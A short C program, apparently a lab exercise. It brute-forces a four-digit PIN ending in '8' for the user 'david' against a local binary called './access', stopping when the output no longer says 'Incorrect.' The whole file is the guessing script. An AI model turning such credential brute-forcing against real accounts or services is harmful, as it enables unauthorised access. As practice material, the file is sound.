#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

void write_data ( FILE * stream, char* val )
{
  char r[30];

  fprintf ( stream, "david\n" );

  fprintf ( stream, "%s\n", val );

}

bool read_data ( FILE * stream, char* val )
{
  char r[100];

  for(int i = 0; i<3; i++){
    fgets( r, sizeof r, stream );
  }

  if( strcmp( r, "Incorrect.\n" ) != 0 ){
    printf("Password is: %s\n", val);
    return true;
  } else {
    return false;
  }
}

void append(char* s, char c)
{
        int len = strlen(s);
        s[len] = c;
        s[len+1] = '\0';
}

void attack( ){
  char val[5];
  FILE *stream;
  bool found = false;

  for(int i = 0; i < 1000; i++ ){

    if( i < 10){
      sprintf( val, "00%d", i );
    } else if( i < 100){
      sprintf( val, "0%d", i );
    } else {
      sprintf( val, "%d", i );
    }

    char c = '8';

    append( val, c );

    // printf("%s\n", val);

    stream = popen ("./access", "r+");

    write_data ( stream, val );
    found = read_data( stream, val );

    pclose( stream );

    if( found ){
      printf( "We have finished\n" );
      break;
    }
  }


}

int main (void)
{

  attack( );

  return EXIT_SUCCESS;
}
